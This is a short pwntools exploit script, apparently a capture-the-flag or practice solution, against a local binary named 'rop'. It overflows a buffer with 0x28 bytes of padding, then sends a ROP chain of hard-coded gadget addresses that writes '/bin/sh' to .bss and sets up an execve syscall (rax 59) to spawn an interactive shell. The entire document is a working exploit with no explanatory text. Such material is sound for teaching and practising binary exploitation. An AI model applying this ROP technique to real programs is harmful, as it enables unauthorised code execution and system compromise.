from pwn import *

x = process("./rop")

bss = 0x00000000006cbb60
pop_rsi = 0x401617
pop_rdx_rsi = 0x442a19
pop_rdi = 0x4014f6
#pop_rdx = 0x4429f6
pop_rax = 0x44f6cc
mov_rdi_rsi = 0x47a712
syscall = 0x4673c5

p = '\x00' * 0x28
p += p64(pop_rsi)
p += '/bin/sh\x00'
p += p64(pop_rdi)
p += p64(bss)
p += p64(mov_rdi_rsi)
p += p64(pop_rdx_rsi)
p += p64(0)
p += p64(0)
#p += p64(pop_rdx)
#p += p64(0)
p += p64(pop_rax)
p += p64(59)
p += p64(syscall)

x.send(p)
x.interactive()

